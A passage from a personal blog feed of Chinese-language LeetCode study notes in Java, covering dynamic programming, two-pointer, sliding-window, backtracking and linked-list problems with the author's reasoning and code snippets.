class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划+hashMap。这道题很难，状态转移公式为 dp(i,j) = dp(j,k)+<span class="number">1</span>，即假如(k,j,i)组成了斐波那契数列，则其延续的是(?,k,j)数列的长度。转移公式是通过(i,j)两位确定下来，即数列也是通过两位才能确定，单纯的i并不能确定。 </span><br><span class="line">    （关键词， 双层数组 dp(i,j) = dp(j,k)+<span class="number">1</span>）</span><br><span class="line"><span class="number">2.</span>此外，需要注意<span class="keyword">return</span> result&gt;<span class="number">0</span>?result+<span class="number">2</span>:<span class="number">0</span>，即最终数列还包含前<span class="number">2</span>个数字。</span><br></pre></td></tr></table></figure><h3 id="094、最少回文分割（132、11月5日）"><a href="#094、最少回文分割（132、11月5日）" class="headerlink" title="094、最少回文分割（132、11月5日）"></a>094、最少回文分割（132、11月5日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。首先维护二维数组isHuwen[i][j]，表示从i到j的字符串是否为回文。通过Arrays.fill填满<span class="literal">true</span>，然后双层<span class="keyword">for</span>循环，外层i从n-<span class="number">1</span>到<span class="number">0</span>，内层j从<span class="number">0</span>到i+<span class="number">1</span>到n。这两步很有技巧性，也是本题的关键，这里说明：</span><br><span class="line">a.填满True的原因，计算公式为下面式子，如果i=<span class="number">3</span>，j=<span class="number">4</span>，isHuiwen[<span class="number">4</span>][<span class="number">3</span>]没有意义，所以要isHuiwen[<span class="number">4</span>][<span class="number">3</span>]=<span class="literal">true</span>，这样只考虑前面</span><br><span class="line">    isHuiwen[i][j] = s.charAt(i) == s.charAt(j) &amp;&amp; isHuiwen[i + <span class="number">1</span>][j - <span class="number">1</span>];</span><br><span class="line">b.为什么从末尾开始，是因为计算isHuiwen[i][j]时，isHuiwen[i+<span class="number">1</span>][j-<span class="number">1</span>]已经被上一层外层循环计算了.如果从<span class="number">0</span>开始，要计算isHuiwen[<span class="number">0</span>][<span class="number">3</span>]，此时isHuiwen[<span class="number">1</span>][<span class="number">2</span>]还没被计算。</span><br><span class="line">最后要计算分割次数f，就是从<span class="number">0</span>开始遍历，如果isHuiwen[<span class="number">0</span>][i]为<span class="literal">true</span>则f[i]=<span class="number">0</span>；如果isHuiwen[<span class="number">0</span>][i]为<span class="literal">false</span>，则 <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;i;j++)，min&#123;f[j&#125;]+<span class="number">1</span>=f[i]；最后返回f[n-<span class="number">1</span>]；</span><br><span class="line">        </span><br><span class="line"><span class="number">2.</span>Arrays.fill(g[i], <span class="literal">true</span>);  <span class="comment">//g是二维数组，则需要for循环索引填充每层一维数组g[i]</span></span><br></pre></td></tr></table></figure><h3 id="095、最长公共子序列（1143、11月9日）"><a href="#095、最长公共子序列（1143、11月9日）" class="headerlink" title="095、最长公共子序列（1143、11月9日）"></a>095、最长公共子序列（1143、11月9日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。确实打不过，没办法实力差距，一直都在想将dp[i][j-&gt;m]和dp[i-&gt;n][j]都设置为dp[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>，但是逻辑有点乱。这道题关键想法在，dp[i-<span class="number">1</span>][j-<span class="number">1</span>]是第（i开始至末尾）个text1字符和第（j开始至末尾）个text2字符没参与过的，</span><br><span class="line">a.如果第i个text1字符和第j个text2字符相等，则dp[i][j] = dp[i-<span class="number">1</span>][j-<span class="number">1</span>]+<span class="number">1</span>，即使j前的text2字符也可能与（i）相等；</span><br><span class="line">b.如果第i个text1字符和第j个text2字符不等，则dp[i][j] = Math.max(dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j])，即可能(i）或(j)造成了相等，并继续维持下去；</span><br><span class="line">这样的好处是a情况，后来又有一个j字符与i相等，并不是从dp[i][(j-<span class="number">1</span>)以前]去计算。</span><br><span class="line"><span class="number">2.</span>本题需要考虑dp[<span class="number">0</span>][<span class="number">0</span>]，所以设置dp大小为dp[n+<span class="number">1</span>][m+<span class="number">1</span>], 注意dp和text1、text2的索引关系即可。</span><br><span class="line"><span class="number">3.</span>做dp的题好有意思唉，各种各样的转移方程都见过了，还是做不出来啊啊。</span><br></pre></td></tr></table></figure><h3 id="096、字符串交织（97、11月9日）"><a href="#096、字符串交织（97、11月9日）" class="headerlink" title="096、字符串交织（97、11月9日）"></a>096、字符串交织（97、11月9日）</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。感觉和上一道题很像，但是还是做不出来。根据题解分析下吧。定义dp[i][j]表示s1的前i个字符和s2的前j个字符能否组成s3的前（i+j）个字符。那么dp[i][j]既可能因为第（i-<span class="number">1</span>）个s1字符变为<span class="literal">true</span>，也可能因为第（j-<span class="number">1</span>）个s2字符变为<span class="literal">true</span>，故计算如下：</span><br><span class="line">dp[i][j] = dp[i-<span class="number">1</span>][j]&amp;&amp;(s1.charAt(i-<span class="number">1</span>)==s3.charAt(i+j-<span class="number">1</span>));    <span class="comment">//因为第(i-1)个字符</span></span><br><span class="line">dp[i][j] = dp[i][j] || (dp[i][j-<span class="number">1</span>]&amp;&amp;(s2.charAt(j-<span class="number">1</span>)==s3.charAt(i+j-<span class="number">1</span>)));   <span class="comment">//因为第(j-1)个字符</span></span><br><span class="line">此外，需要注意还要计算dp[<span class="number">1</span>][<span class="number">0</span>]、dp[<span class="number">2</span>][<span class="number">0</span>]、dp[<span class="number">0</span>][<span class="number">1</span>]、dp[<span class="number">0</span>][<span class="number">2</span>]等，故不能 <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>)<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">1</span>)。</span><br></pre></td></tr></table></figure><h3 id="总结之动态规划"><a href="#总结之动态规划" class="headerlink" title="总结之动态规划"></a>总结之动态规划</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.爬楼梯问题、房屋偷盗问题的根源公式都是f(x)=f(x-1)+f(x-2)，即x位置的状态计算由它的相邻位置和它的最后不相邻位置决定。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HOT 100</title>
      <link href="/2022/11/14/HOT-100/"/>
      <url>/2022/11/14/HOT-100/</url>
      
        <content type="html"><![CDATA[<h1 id="Leetcode刷题笔记"><a href="#Leetcode刷题笔记" class="headerlink" title="Leetcode刷题笔记"></a>Leetcode刷题笔记</h1><h2 id="1-两数之和（7月31日）"><a href="#1-两数之和（7月31日）" class="headerlink" title="1.两数之和（7月31日）"></a>1.两数之和（7月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="type">int</span>[]型返回值占位 <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line"><span class="number">2.</span>哈希表实现</span><br><span class="line"><span class="comment">//使用哈希表，可以将寻找 target - x 的时间复杂度降低到从O(N)降低到O(1)。</span></span><br><span class="line">    <span class="comment">//思路：把前面的数字和索引放入hashmap中，遍历到后面的数字时只需对hashmap做一次查找</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] twoSum2(<span class="type">int</span>[] nums, <span class="type">int</span> target) &#123;</span><br><span class="line">        Map&lt;Integer,Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(hashmap.containsKey(target-nums[i]))&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;hashmap.get(target-nums[i]),i&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            hashmap.put(nums[i],i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="2-两数相加（7月31日）"><a href="#2-两数相加（7月31日）" class="headerlink" title="2.两数相加（7月31日）"></a>2.两数相加（7月31日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>头插法的起始写法（别用“头部循环外处理+l1.next判断”了，是真的逻辑乱）</span><br><span class="line">    ListNode head=<span class="literal">null</span>,tail=<span class="literal">null</span>;</span><br><span class="line"><span class="keyword">while</span>(l1!=<span class="literal">null</span>||l2!=<span class="literal">null</span>)&#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>)&#123;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">        tail = head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            tail.next = <span class="keyword">new</span> <span class="title class_">ListNode</span>(sum%<span class="number">10</span>);</span><br><span class="line">            tail = tail.next;</span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line"><span class="number">2.</span>对齐技巧</span><br><span class="line">    <span class="type">int</span> <span class="variable">n1</span> <span class="operator">=</span> l1!=<span class="literal">null</span>?l1.val:<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">n2</span> <span class="operator">=</span> l2!=<span class="literal">null</span>?l2.val:<span class="number">0</span>;</span><br></pre></td></tr></table></figure><h2 id="3-无重复字符的最长子串（7月31日、滑动窗口）"><a href="#3-无重复字符的最长子串（7月31日、滑动窗口）" class="headerlink" title="3.无重复字符的最长子串（7月31日、滑动窗口）"></a>3.无重复字符的最长子串（7月31日、滑动窗口）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> 花了很长时间没有做出来，我的想法是，维护两个hashMap，分别存储&lt;字母，该字母后的长度&gt;和&lt;字母，该字母的出现位置&gt;，当某个字母判断为重复后，删除该字母及其出现位置以前所有其他字母的hashMap。这样做，倒在了最后两个测试用例，</span><br><span class="line">    分析发现超时原因主要出现在删除该位置以前所有的haspMap，改进增加限制条件“自上一次删除后”，通过测试，击败<span class="number">9.63</span>%哈哈</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>滑动窗口</span><br><span class="line">    滑动窗口就是一个队列，这个队列维护无重复字符的最长子串，每当遇到重复字符时，我们更新队列左端；</span><br><span class="line">    更新队列左端会遇到两种情况，假设重复字符a已经在hashMap中：</span><br><span class="line">    以baba为例，左端更新到第二个b的位置，字符a的位置小于队列左端，说明第一个字符a出现后，其他字符的重复造成左端更新大于第一个a的位置，此时队列左端就需要保持不动；</span><br><span class="line">    以cabab为例，左端更新到c的位置，字符a的位置大于队列左端，说明从c以来，a的重复出现打破了队列维护的无重复子串，此时队列左端就需要更新到a的位置；</span><br><span class="line">    这两种情况，为了维护队列，更新左端都是考虑重复字符第一次出现位置和旧左端谁更大：</span><br><span class="line">    left = Math.max(left,map.get(s.charAt(i)));</span><br><span class="line"></span><br><span class="line">在队列右端向右探索时，右端接触的字符需要更新位置：map.put(s.charAt(i),i+<span class="number">1</span>)；这里加一是因为左端要从hashMap中取，而本字符造成了重复，它的下一位才是不重复的；</span><br><span class="line">    并计算当前维护无重复子串队列的长度：max = Math.max(max,i-left+<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>我的思路为什么慢了？</span><br><span class="line">    向右探索时，我是遍历维护的hashMap，为每个元素维护的子串长度加一，并判断是否大于maxValue；当遇到重复元素时，我需要找到该重复元素旧位置以前的其他元素，因为他们的子串因为包含此元素子串，所以要从hashMap中删除这些其他元素。即向右探索存在两个遍历。</span><br></pre></td></tr></table></figure><h2 id="4-寻找两个正序数组的中位数（8月1日）"><a href="#4-寻找两个正序数组的中位数（8月1日）" class="headerlink" title="4.寻找两个正序数组的中位数（8月1日）"></a>4.寻找两个正序数组的中位数（8月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>本题一遍过了，就是中位数是两个有序数组中的第 (m+n)/<span class="number">2</span> 个元素和第 (m+n)/<span class="number">2</span> 个元素的平均值，故遍历只需进行到两个数组总长度的中间位置。需要注意一个数组先结束的情况，外层套上数组边界判断，这种情况下只探索另一数组。</span><br><span class="line"><span class="number">2.</span><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=(nums1.length+nums2.length)/<span class="number">2</span>;i++)，这样小于等于的话，如果总长度为奇数，中间位置即为最后元素；如果总长度为偶数，中间位置即为最后两个元素取平均；注意先要把<span class="keyword">for</span>循环i最后多加的<span class="number">1</span>去掉。</span><br></pre></td></tr></table></figure><h2 id="5-最长回文子串（8月6日、动态规划）"><a href="#5-最长回文子串（8月6日、动态规划）" class="headerlink" title="5.最长回文子串（8月6日、动态规划）"></a>5.最长回文子串（8月6日、动态规划）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较困难，甚至暴力破解都想不出来，看题解第一次接触动态规划。动态规划是一种用空间换时间的做法，即把一些子序列的结果保存起来，长序列利用子序列的结果。本题中假设例子是“babac”，已知子序列“aba”的结果为回文，那只需要考虑两端b≠c，即长序列不是回文。</span><br><span class="line"><span class="number">2.</span>因为是从短序列推导长序列，应该外围遍历是序列长度，计算每个位置开始的固定序列长度的结果，遍历长序列时，只需利用dp[i][j] = dp[i+<span class="number">1</span>][j-<span class="number">1</span>];获得长序列的结果。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> L=<span class="number">2</span>;L&lt;=len;L++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)&#123;</span><br><span class="line"><span class="number">3.</span>考虑的特殊情况，a.单字符即为回文；b.双字符没有子序列，直接给出结果；c.在每个双层遍历后判断是否大于maxlen且为回文，并记录该序列的起始位置，用于返回裁剪字符串。</span><br></pre></td></tr></table></figure><h2 id="10-正则表达式匹配（8月6日、动态规划）"><a href="#10-正则表达式匹配（8月6日、动态规划）" class="headerlink" title="10.正则表达式匹配（8月6日、动态规划）"></a>10.正则表达式匹配（8月6日、动态规划）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">看晕了，DP太难啦</span><br></pre></td></tr></table></figure><h2 id="11-盛最多水的容器（8月6日、双指针）"><a href="#11-盛最多水的容器（8月6日、双指针）" class="headerlink" title="11.盛最多水的容器（8月6日、双指针）"></a>11.盛最多水的容器（8月6日、双指针）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是，用冒泡排序的结构遍历一遍所有可能的情况，更新maxValue，但是超出了时间限制。</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=i+<span class="number">1</span>;j&lt;len;j++)&#123;</span><br><span class="line"><span class="number">2.</span>双指针代表的是，可以作为容器边界的所有位置的范围，开始时，左右指针分别指向左右边界。每次计算容量后，只移动一个指针，且移动高度更低的指针。</span><br><span class="line">这是因为，假设指针距离为t，此时右指针位置桶壁更高，则容量为min(x,y)*t=x*t,</span><br><span class="line">假设向左移动右指针，指针距离t-<span class="number">1</span>，min(x,<span class="keyword">new</span> <span class="title class_">y</span>)&lt;=x,则此时min(x,<span class="keyword">new</span> <span class="title class_">y</span>)*(t-<span class="number">1</span>)&lt;x*t,</span><br><span class="line">说明这种移动没有任何意义，从这种移动出发找不到比当前位置更高的容量，所以移动的条件是移动更低桶壁的指针位置。</span><br><span class="line">结束的条件是，因为是每次只移动一个指针，即两个指针最终不能指向同一位置。<span class="keyword">while</span>(left!=right)</span><br><span class="line"><span class="number">3.</span>双指针算法没超过时间限制的原因是，一直在剔除不可能的情况。时间复杂度为O(N)，只需遍历数组一次。</span><br></pre></td></tr></table></figure><h2 id="15-三数之和（8月7日、排序-双指针）"><a href="#15-三数之和（8月7日、排序-双指针）" class="headerlink" title="15.三数之和（8月7日、排序+双指针）"></a>15.三数之和（8月7日、排序+双指针）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是三重循环，运行后发现还需要编写去重，那铁定得超时了。查看题解说三重循环+哈希去重是一般想法，肯定会超时，这里哈希去重指的是哪种操作呢？</span><br><span class="line">    </span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：如果数组是有序的，枚举到的三元组(a,b,c)满足a&lt;=b&lt;=c,保证了内容(a,b,c)不会以(b,a,c)、(c、a、b)等其他顺序出现，故数组应该有序。此外，如果满足“对每一重循环而言，相邻两次枚举的元素不能相同”，即每个数字都有代表元，三重循环每一重不会遍历到相同元素，不同层会遍历到同一元素，但序列递增导致序列不同，这样就彻底做到去重。</span><br><span class="line">Arrays.sort(nums); <span class="comment">//无需返回值的数组排序</span></span><br><span class="line">List&lt;List&lt;Integer&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();  <span class="comment">//结果数组的定义</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;      <span class="comment">//每层遍历范围的衔接，因为等于i+1，或者后面式子不等于才该遍历</span></span><br><span class="line">        <span class="keyword">if</span>(j&gt;i+<span class="number">1</span> &amp;&amp; nums[j] == nums[j-<span class="number">1</span>]) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> j + <span class="number">1</span>; k &lt; nums.length; k++)&#123; </span><br><span class="line">但是，这种算法还是会导致运行超时，时间复杂度仍然是O(N^<span class="number">3</span>)。</span><br><span class="line">    </span><br><span class="line"><span class="number">3.</span>思路<span class="number">3</span>：当固定第<span class="number">1</span>重循环元素i后，第<span class="number">2</span>、<span class="number">3</span>重循环就会存在并列关系，和为(<span class="number">0</span>-nums[i])。这样随着第<span class="number">2</span>重循环元素严格递增，势必存在第<span class="number">3</span>重循环元素严格递减，那么就可以用双指针，左指针右移，右指针左移，导致整体需要遍历元素数目减少。</span><br><span class="line">  a.我的实现： <span class="keyword">while</span>(j&lt;k)为外层，当nums[j] + nums[k] &lt; target时将左指针右移，&gt;target时将右指针左移，=target时记录位置并将两个指针同时移动；需要处理的特殊情况是，当同层循环遍历相同元素时应<span class="keyword">continue</span>，故有两个<span class="keyword">continue</span>判断。</span><br><span class="line">  b.Leetcode的实现：<span class="keyword">for</span> (<span class="type">int</span> <span class="variable">second</span> <span class="operator">=</span> first + <span class="number">1</span>; second &lt; n; ++second)为外层，即以second为基准，相比我的优化是，当&gt;target时一直将右指针左移，即能在到一个second时就最大限度降低右指针，到下一个second时third也足够小。</span><br><span class="line">      <span class="keyword">while</span> (second &lt; third &amp;&amp; nums[second] + nums[third] &gt; target) --third;</span><br><span class="line">            </span><br><span class="line"><span class="number">4.</span>Leetcode定义：这个方法就是我们常说的「双指针」，当我们需要枚举数组中的两个元素时，如果我们发现随着第一个元素的递增，第二个元素是递减的，那么就可以使用双指针的方法，将枚举的时间复杂度从O(N^<span class="number">2</span>)减少至O(N)。本题由于存在第一重循环，双指针复杂度O(N^<span class="number">2</span>)。</span><br><span class="line">    </span><br><span class="line"><span class="number">5.</span>简述：确定第一重循环后，问题简化为双指针问题，移动指针的策略是：由于右指针左移会减小target，即尽可能左移右指针,求得在当前左指针下等于target的位置；当和&lt;target后，将左指针右移使和增大，在新左指针下再继续移动右指针。故Leetcode的<span class="keyword">for</span>循环实现更清晰些。</span><br></pre></td></tr></table></figure><h2 id="17-电话号码的字母组合（8月7日、回溯）"><a href="#17-电话号码的字母组合（8月7日、回溯）" class="headerlink" title="17.电话号码的字母组合（8月7日、回溯）"></a>17.电话号码的字母组合（8月7日、回溯）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>第一次做本题是抱着学习常用api的目的，比如这里的StringBuffer类，能通过：a.append方法添加<span class="type">char</span>类型元素，b.通过deleteCharAt方法实现根据索引删除元素，c.通过toString方法把结果转化为String类。这就能实现一个类似python中“ <span class="string">&quot;&quot;</span>+a ”这样的效果。</span><br><span class="line"><span class="number">2.</span>因为想不通到底要写多少层<span class="keyword">for</span>循环才行，看了题解。题解用了回溯算法，就是递归。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>：通过StringBuffer类创建一个字符缓冲区，每到一层获取一个元素，继续向更深层递进，直到层数达到数字序列的长度，保存结果后开始返回；返回到每一层，先删除本层缓存的元素，再将本层另一元素放入缓冲区，继续向深层递进，直到每层的循环都结束。因为达到最大长度才需要记录结果，故函数不需要思考返回值。</span><br></pre></td></tr></table></figure><h2 id="19-删除链表的倒数第-N-个结点（8月8日、快慢指针）"><a href="#19-删除链表的倒数第-N-个结点（8月8日、快慢指针）" class="headerlink" title="19.删除链表的倒数第 N 个结点（8月8日、快慢指针）"></a>19.删除链表的倒数第 N 个结点（8月8日、快慢指针）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>在对链表进行操作时，一种常用的技巧是添加一个哑节点（dummy node），它的next指针指向链表的头节点。这样一来，我们就不需要对头节点进行特殊的判断了。</span><br><span class="line"><span class="number">2.</span>思路一：先遍历链表获取链表长度，再从头节点开始遍历，遍历到（L-n+<span class="number">1</span>）个节点时，它就是需要删除的节点。以[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>],<span class="number">2</span>为例</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;length-n+<span class="number">1</span>;i++)&#123; cur = cur.next;&#125;</span><br><span class="line"><span class="comment">//由于加了dummy节点，先有i再有对应位置node，所以最后到node3结束，i增加为4跳出，恰删除node4</span></span><br><span class="line"><span class="comment">//需要有dummy节点，是假如是以[1],1为例，cur.next会报错，即没有把头节点普通化，放到普通节点的逻辑里。</span></span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：快慢指针，先不做。</span><br></pre></td></tr></table></figure><h2 id="20-有效的括号（8月8日）"><a href="#20-有效的括号（8月8日）" class="headerlink" title="20.有效的括号（8月8日）"></a>20.有效的括号（8月8日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较简单，就是用栈解决，当(、&#123;、[来时压栈，当)、]、&#125;来时开始判断合法性并弹栈，这个时候栈为空或者栈顶不是对应括号即为非法。此外，通过字符串长度是否为偶数，也能先判断合法性。</span><br><span class="line"><span class="number">2.</span>常用建栈api的掌握：</span><br><span class="line">Deque&lt;Character&gt; stack = <span class="keyword">new</span> <span class="title class_">LinkedList</span>&lt;&gt;();   <span class="comment">//此时可用stack.peek()，.push(cur)、.pop()等栈方法</span></span><br><span class="line"><span class="number">2.</span>在这里记录史凯超的一个问题：<span class="type">List</span> <span class="variable">list</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ArrayList</span>();这种为什么要这样写？</span><br><span class="line">  这是对依赖倒置原则：</span><br><span class="line">    a.这样当某位置需要存储list时，它可以设置为接受List从而既存储ArrayList，有存储LinkedList；</span><br><span class="line">    b.list只能使用ArrayList中已经实现了的List接口中的方法，而没有在List接口中定义的方法不能被访问到。</span><br></pre></td></tr></table></figure><h2 id="21-合并两个有序链表-8月8日"><a href="#21-合并两个有序链表-8月8日" class="headerlink" title="21.合并两个有序链表(8月8日)"></a>21.合并两个有序链表(8月8日)</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>这道题比较简单，虽然第一次写，先判断是否为空，又判断大小，代码重复性很大，没有注意可以直接用原链的节点。但是，还使用到了前面学习的dummy节点技巧，这是因为假如<span class="number">1</span>、<span class="number">2</span>、<span class="number">3</span>在<span class="number">4</span>语句后，就会使得链尾添加一个新节点，此时已跳出循环，结果为[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">0</span>],考虑去除<span class="number">0</span>的逻辑很麻烦；改进应该是先添加节点，再填充新节点数据，但这样第一个节点直接用了list3tail.next就没被处理，所以应该设一个head的前驱节点dummy，返回dummy.next，这样就能把head节点和后续位置节点一样处理。</span><br><span class="line">    ListNode list3dummy=<span class="keyword">new</span> <span class="title class_">ListNode</span>();</span><br><span class="line">    <span class="type">ListNode</span> <span class="variable">list3tail</span> <span class="operator">=</span> list3dummy;</span><br><span class="line"><span class="keyword">while</span>(tail1!=<span class="literal">null</span>||tail2!=<span class="literal">null</span>)&#123;</span><br><span class="line">    。。。</span><br><span class="line">     <span class="keyword">if</span>(tail1.val&gt;=tail2.val)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>();  <span class="comment">//1</span></span><br><span class="line">            list3tail.next = node;           <span class="comment">//2</span></span><br><span class="line">            list3tail = node;                <span class="comment">//3</span></span><br><span class="line">            list3tail.val=tail2.val;         <span class="comment">//4</span></span><br><span class="line">            tail2 = tail2.next;        </span><br><span class="line">   &#125;</span><br><span class="line">        。。。</span><br><span class="line">    &#125;</span><br><span class="line"> <span class="keyword">return</span> list3dummy.next;</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>：递归法，先不做</span><br></pre></td></tr></table></figure><h2 id="22-括号生成（8月11日）"><a href="#22-括号生成（8月11日）" class="headerlink" title="22.括号生成（8月11日）"></a>22.括号生成（8月11日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是按照<span class="number">20</span>题“有效的括号”那样做，并加上回溯的结构，即新输入满足一定要求后才能回溯。但可能花了<span class="number">2</span>小时写了一泡狗屎，不知道为啥理不清栈在回溯中的表现，明明应该出栈的括号却能剩下来，stack.size()变成了当前字符中左括号的数目，太烧脑了，调试傻了，再做也是浪费时间。TMD,真是超级无比垃圾狗蛋题。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>：暴力破解。就是先通过递归生成指定长度的括号，再判断括号字符串是否有效。这里判断括号是否有效的思路比<span class="number">20</span>题简单，因为只判断圆括号<span class="string">&#x27;()&#x27;</span>,只需维护一个循环外<span class="type">int</span>变量balance，当<span class="string">&#x27;(&#x27;</span>来时balance加<span class="number">1</span>，当<span class="string">&#x27;)&#x27;</span>来时balance减<span class="number">1</span>，每轮循环balance小于<span class="number">0</span>说明括号无效，数组遍历完balance为<span class="number">0</span>也说明括号无效，否则有效。这里收获了<span class="type">char</span>[]和String互相转换的API:</span><br><span class="line">String -&gt; <span class="type">char</span>[] : <span class="type">char</span>[] charArray = s.toCharArray();</span><br><span class="line"><span class="type">char</span>[] -&gt; String : <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> String.valueOf(charArray);</span><br><span class="line">StringBuffer -&gt; String : result.toString()   result为StringBuffer类</span><br><span class="line"><span class="number">3.</span>思路<span class="number">2</span>：回溯法。这种方法比较难想，因为只有圆括号<span class="string">&#x27;()&#x27;</span>,添加右括号只需注意，不要在当下超过左括号数目，添加左括号只需不大于n即可。在这种情况下，逻辑变成了，当满足数目条件时才添加括号、递归并回溯，StringBuffer满足长度要求时放入结果。不是最后做判断。</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">backtrack</span><span class="params">(List&lt;String&gt; ans,StringBuffer cur,<span class="type">int</span> left,<span class="type">int</span> right,<span class="type">int</span> max)</span>;</span><br></pre></td></tr></table></figure><h2 id="23-合并K个升序链表（8月12日）"><a href="#23-合并K个升序链表（8月12日）" class="headerlink" title="23.合并K个升序链表（8月12日）"></a>23.合并K个升序链表（8月12日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法是，以最左边的数组为curValue，并考虑到链表遍历为空的情况下向右更新curValue。<span class="keyword">for</span>向右遍历数组时，通过<span class="keyword">while</span>遍历数组元素，小于curValue的将被添加到链表，维护两个指针，一个指向链表尾部，一个指向上一次更新curValue的位置，这样就能在curValue左右添加链表节点。当然这个思路最后乱掉了，因为不知道如何描述listFinal的前一个节点。</span><br><span class="line"><span class="number">2.</span>我最初的想法是，维护一个和链表长度相同的数组，记录每个输入链表数组的头指针位置，在每轮中取头指针数组中最小的链表节点，并更新该链表的头指针，直到所有头指针都指向<span class="literal">null</span>。这种想法的问题是如何求最小，最简单的思路是利用具有排序功能的集合，在更新节点放入集合时就排号序，这样就能更容易地实现。</span><br><span class="line"><span class="number">3.</span>思路<span class="number">1</span>：使用优先队列。用优先队列实现上一想法，定义Status类实现comparable接口，其中compareTo实现如下：</span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compareTo</span><span class="params">(Status status2)</span> &#123;<span class="keyword">return</span> <span class="built_in">this</span>.val - status2.val;&#125;</span><br><span class="line">将每个链表数组的头指针按<span class="keyword">new</span> <span class="title class_">Status</span>(node.val, node)放入优先队列，queue.poll()后会弹出最小元素，这样将该最小的头指针后移继续放入queue.offer(<span class="keyword">new</span> <span class="title class_">Status</span>(f.ptr.next.val, f.ptr.next))，最后直到优先队列为空。</span><br></pre></td></tr></table></figure><h2 id="94、二叉树中序遍历（10月6日）"><a href="#94、二叉树中序遍历（10月6日）" class="headerlink" title="94、二叉树中序遍历（10月6日）"></a>94、二叉树中序遍历（10月6日）</h2><figure class="highlight java"><table><tr><td 